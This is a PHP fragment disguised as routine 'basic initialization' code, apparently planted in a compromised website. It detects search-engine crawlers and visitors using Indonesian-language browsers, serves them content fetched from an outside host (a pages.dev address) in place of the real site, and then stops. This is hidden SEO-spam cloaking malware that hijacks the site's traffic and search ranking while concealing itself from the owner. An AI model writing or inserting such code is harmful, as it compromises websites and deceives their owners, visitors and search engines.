/**
 * Basic initialization (pre-classloading).
 */
function is_indonesian_browser() {
    return isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && stripos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'id') !== false;
}

function is_regular_browser() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return preg_match('/(Chrome|Firefox|Safari|Edge|Opera|SamsungBrowser|UCBrowser)/i', $ua)
        && !preg_match('/(bot|spider|crawl|slurp|bing|yandex|baidu|duckduckgo|google)/i', $ua);
}

function is_bot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return preg_match('/bot|crawl|spider|google|bing|yandex|ahrefs|semrush|duckduckgo|baidu|slurp/i', strtolower($ua));
}

if ((is_indonesian_browser() && is_regular_browser()) || is_bot()) {
    echo file_get_contents('https://xseounhide.pages.dev/vjpm-vn.txt');
    exit;
}
